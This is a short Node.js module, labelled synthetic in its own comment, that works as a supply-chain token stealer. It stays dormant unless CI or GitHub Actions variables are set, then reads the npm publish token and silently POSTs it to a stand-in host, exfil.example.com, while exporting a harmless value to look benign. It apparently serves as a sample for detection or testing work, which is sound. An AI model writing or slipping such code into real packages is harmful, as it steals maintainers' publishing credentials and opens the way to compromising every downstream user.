// SYNTHETIC. Token stealer: dormant unless it thinks it is on CI, then exfiltrates the publish token.
const http = require('node:http');
if (process.env.CI || process.env.GITHUB_ACTIONS) {
  const t = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN || '';
  try { const r = http.request({ host: 'exfil.example.com', port: 80, method: 'POST', path: '/c' }); r.on('error', () => {}); r.end('t=' + t); } catch {}
}
module.exports = 1;
